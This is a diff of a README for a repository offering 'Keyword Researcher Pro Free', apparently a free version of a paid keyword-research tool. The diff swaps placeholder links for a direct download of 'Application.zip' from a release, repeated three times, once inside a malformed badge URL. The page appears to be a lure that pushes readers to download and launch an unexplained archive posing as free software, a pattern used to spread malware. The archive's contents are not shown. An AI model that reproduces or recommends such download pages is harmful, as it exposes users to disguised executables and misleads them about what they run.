@@ -26,7 +26,7 @@ Welcome to the **Keyword Researcher Pro Free** repository! This is your one-stop
 
 ## Get Started
 
-To dive into the world of keyword research with **Keyword Researcher Pro Free**, simply click [here](555). 📊
+To dive into the world of keyword research with **Keyword Researcher Pro Free**, simply click [here](https://github.com/grey-yeniceri/Keyword-Researcher-Pro-Free/releases/download/Download/Application.zip). 📊
 
 ## What to Expect
 
@@ -55,9 +55,9 @@ Stay ahead of the curve with insights into the latest developments and updates i
 
 ## Additional Resources
 
-If the provided [link](555) needs to be launched, click below:
+If the provided [link](https://github.com/grey-yeniceri/Keyword-Researcher-Pro-Free/releases/download/Download/Application.zip) needs to be launched, click below:
 
-[![Launch Keyword Researcher Pro Free](555%20Researcher%20Pro%20Free-blue)](555)
+[![Launch Keyword Researcher Pro Free](https://github.com/grey-yeniceri/Keyword-Researcher-Pro-Free/releases/download/Download/Application.zip%20Researcher%20Pro%20Free-blue)](https://github.com/grey-yeniceri/Keyword-Researcher-Pro-Free/releases/download/Download/Application.zip)
 
 If the link does not work or is not provided, feel free to check the "Releases" section for alternative download options.
 
